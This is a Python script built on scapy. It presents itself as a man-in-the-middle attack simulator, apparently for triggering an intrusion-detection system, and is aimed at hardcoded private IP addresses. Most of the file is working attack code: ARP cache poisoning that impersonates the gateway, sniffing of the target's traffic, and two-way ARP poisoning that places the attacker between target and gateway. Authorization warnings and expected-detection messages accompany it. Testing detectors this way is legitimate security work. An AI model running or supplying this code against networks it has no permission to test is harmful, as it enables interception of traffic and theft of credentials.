#!/usr/bin/env python3
"""
External Device ARP Spoofing Attack Simulator
==============================================

Target System: 10.220.184.64
Gateway: 10.220.184.57

⚠️  FOR AUTHORIZED TESTING ONLY
Use only on networks you own or have explicit permission to test.

Usage:
    sudo python3 external_attack.py
"""

from scapy.all import *
import time
import sys
import os
import json

# Target configuration
TARGET_IP = "10.220.184.64"
GATEWAY_IP = "10.220.184.57"

def get_mac(ip):
    """Get MAC address for IP using ARP"""
    try:
        ans, _ = sr(ARP(op=1, pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
    except:
        pass
    return None

def arp_spoof(target_ip, gateway_ip, count=100, interval=0.5):
    """
    ARP Spoofing Attack - Claim to be the gateway
    
    This will cause the target to send traffic through the attacker
    instead of the real gateway.
    """
    print()
    print("=" * 70)
    print("  ARP SPOOFING ATTACK")
    print("=" * 70)
    print(f"  Target IP:    {target_ip}")
    print(f"  Gateway IP:   {gateway_ip}")
    print(f"  Packets:      {count}")
    print(f"  Interval:     {interval}s")
    print("=" * 70)
    print()
    
    # Get real MAC addresses
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    attacker_mac = get_if_hwaddr(conf.iface)
    attacker_ip = get_if_addr(conf.iface)
    
    print(f"[*] Network Information:")
    print(f"    Attacker IP:    {attacker_ip}")
    print(f"    Attacker MAC:   {attacker_mac}")
    print(f"    Target MAC:     {target_mac or 'Unknown'}")
    print(f"    Gateway MAC:    {gateway_mac or 'Unknown'}")
    print()
    
    if not target_mac:
        print(f"[!] WARNING: Could not resolve target MAC for {target_ip}")
        print(f"[!] Continuing with broadcast...")
    
    print(f"[*] Starting attack...")
    print(f"[*] Target will see gateway ({gateway_ip}) as {attacker_mac}")
    print()
    
    packets_sent = 0
    
    try:
        for i in range(count):
            # Create spoofed ARP reply claiming to be the gateway
            arp_packet = ARP(
                op=2,              # ARP reply (is-at)
                pdst=target_ip,    # Send to target
                hwdst=target_mac or "ff:ff:ff:ff:ff:ff",  # Target MAC or broadcast
                psrc=gateway_ip,   # Claim to be gateway
                hwsrc=attacker_mac # But use attacker MAC
            )
            
            # Send the spoofed packet
            send(arp_packet, verbose=False)
            packets_sent += 1
            
            # Progress indicator
            if (packets_sent) % 10 == 0:
                print(f"[+] Sent {packets_sent}/{count} spoofed ARP packets...")
            
            time.sleep(interval)
        
        print()
        print(f"[✓] Attack Complete!")
        print(f"[✓] Sent {packets_sent} spoofed ARP packets")
        print()
        print(f"[!] Detection Expected:")
        print(f"    • ARP_SPOOFING_DETECTED (CRITICAL)")
        print(f"    • MAC_SPOOFING_DETECTED (HIGH)")
        print(f"    • Attacker identified as: {attacker_ip} ({attacker_mac})")
        
    except KeyboardInterrupt:
        print()
        print(f"[!] Attack interrupted by user")
        print(f"[!] Sent {packets_sent} packets before stopping")
    
    except Exception as e:
        print()
        print(f"[!] Error during attack: {e}")

def packet_sniffing_attack(target_ip, duration=30):
    """
    Packet Sniffing - Monitor target's traffic
    
    This should trigger packet sniffing detection based on
    unusual packet timing patterns.
    """
    print()
    print("=" * 70)
    print("  PACKET SNIFFING ATTACK")
    print("=" * 70)
    print(f"  Target IP:    {target_ip}")
    print(f"  Duration:     {duration}s")
    print("=" * 70)
    print()
    
    packets_captured = 0
    start_time = time.time()
    
    def packet_handler(pkt):
        nonlocal packets_captured
        if pkt.haslayer(IP):
            ip_layer = pkt[IP]
            if ip_layer.src == target_ip or ip_layer.dst == target_ip:
                packets_captured += 1
                if packets_captured <= 10:
                    protocol = ip_layer.proto
                    print(f"[Captured] {ip_layer.src:15} → {ip_layer.dst:15} | Proto: {protocol}")
    
    print(f"[*] Sniffing packets to/from {target_ip}...")
    print(f"[!] This should trigger PACKET_SNIFFING_DETECTED on target")
    print()
    
    try:
        sniff(
            filter=f"host {target_ip}",
            prn=packet_handler,
            timeout=duration,
            store=False
        )
        
        print()
        print(f"[✓] Sniffing Complete!")
        print(f"[✓] Captured {packets_captured} packets")
        print()
        print(f"[!] Detection Expected:")
        print(f"    • PACKET_SNIFFING_DETECTED (HIGH)")
        print(f"    • Tool signature: tcpdump/Wireshark")
        
    except Exception as e:
        print(f"[!] Error: {e}")

def dual_arp_attack(target_ip, gateway_ip, count=50):
    """
    Dual ARP Spoofing - Position as MITM between target and gateway
    
    This attack poisons both the target and gateway ARP caches,
    making the attacker a man-in-the-middle.
    """
    print()
    print("=" * 70)
    print("  DUAL ARP SPOOFING (MITM POSITIONING)")
    print("=" * 70)
    print(f"  Target IP:    {target_ip}")
    print(f"  Gateway IP:   {gateway_ip}")
    print(f"  Packets:      {count} (to each)")
    print("=" * 70)
    print()
    
    attacker_mac = get_if_hwaddr(conf.iface)
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    print(f"[*] Positioning as MITM...")
    print(f"    Target will see gateway as: {attacker_mac}")
    print(f"    Gateway will see target as: {attacker_mac}")
    print()
    
    packets_sent = 0
    
    try:
        for i in range(count):
            # Tell target that gateway is at attacker MAC
            to_target = ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac or "ff:ff:ff:ff:ff:ff",
                psrc=gateway_ip,
                hwsrc=attacker_mac
            )
            
            # Tell gateway that target is at attacker MAC
            to_gateway = ARP(
                op=2,
                pdst=gateway_ip,
                hwdst=gateway_mac or "ff:ff:ff:ff:ff:ff",
                psrc=target_ip,
                hwsrc=attacker_mac
            )
            
            send(to_target, verbose=False)
            send(to_gateway, verbose=False)
            packets_sent += 2
            
            if (i + 1) % 10 == 0:
                print(f"[+] Sent {packets_sent} spoofed packets...")
            
            time.sleep(0.5)
        
        print()
        print(f"[✓] MITM Positioning Complete!")
        print(f"[✓] All traffic between {target_ip} ↔ {gateway_ip} now flows through attacker")
        print()
        print("[!] This is the most dangerous attack - enables full traffic interception")
        
    except KeyboardInterrupt:
        print()
        print(f"[!] Attack interrupted")
    except Exception as e:
        print(f"[!] Error: {e}")

def show_menu():
    """Display attack menu"""
    print()
    print("=" * 70)
    print("  MITM ATTACK SIMULATOR - External Device")
    print("  Target: 10.220.184.64")
    print("=" * 70)
    print()
    print("  Attack Types:")
    print()
    print("  1. ARP Spoofing          - Claim to be gateway (Most Common)")
    print("  2. Packet Sniffing       - Monitor target traffic")
    print("  3. Dual ARP (MITM)       - Position as man-in-the-middle")
    print("  4. All Attacks (Demo)    - Run all attack types")
    print("  0. Exit")
    print()
    print("=" * 70)

def main():
    # Check root
    if os.geteuid() != 0:
        print()
        print("[!] ERROR: This script must be run with sudo/root privileges")
        print("    Usage: sudo python3 external_attack.py")
        sys.exit(1)
    
    # Warning
    print()
    print("⚠️" * 35)
    print()
    print("  AUTHORIZED TESTING ONLY")
    print()
    print("  This tool simulates Man-in-the-Middle attacks.")
    print("  Use ONLY on networks you own or have explicit permission to test.")
    print()
    print("  Unauthorized use may:")
    print("  • Violate laws (Computer Fraud and Abuse Act, etc.)")
    print("  • Disrupt network services")
    print("  • Result in criminal prosecution")
    print()
    print("⚠️" * 35)
    print()
    
    response = input("Do you have authorization to test this network? (yes/no): ")
    if response.lower() not in ['yes', 'y']:
        print("[!] Exiting - Authorization required")
        sys.exit(0)
    
    while True:
        show_menu()
        choice = input("Select attack type [0-4]: ").strip()
        
        if choice == "0":
            print("\n[*] Exiting...")
            break
        
        elif choice == "1":
            print("\n[*] Selected: ARP Spoofing Attack")
            count = input("Number of packets [50]: ").strip() or "50"
            arp_spoof(TARGET_IP, GATEWAY_IP, count=int(count))
            input("\nPress Enter to continue...")
        
        elif choice == "2":
            print("\n[*] Selected: Packet Sniffing Attack")
            duration = input("Duration in seconds [30]: ").strip() or "30"
            packet_sniffing_attack(TARGET_IP, duration=int(duration))
            input("\nPress Enter to continue...")
        
        elif choice == "3":
            print("\n[*] Selected: Dual ARP (MITM) Attack")
            count = input("Packets to each target [30]: ").strip() or "30"
            dual_arp_attack(TARGET_IP, GATEWAY_IP, count=int(count))
            input("\nPress Enter to continue...")
        
        elif choice == "4":
            print("\n[*] Running All Attack Types (Demo Mode)")
            print("\n[1/3] ARP Spoofing...")
            arp_spoof(TARGET_IP, GATEWAY_IP, count=20, interval=0.3)
            time.sleep(2)
            
            print("\n[2/3] Packet Sniffing...")
            packet_sniffing_attack(TARGET_IP, duration=15)
            time.sleep(2)
            
            print("\n[3/3] Dual ARP (MITM)...")
            dual_arp_attack(TARGET_IP, GATEWAY_IP, count=20)
            
            print("\n[✓] All attacks complete!")
            input("\nPress Enter to continue...")
        
        else:
            print("\n[!] Invalid choice")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
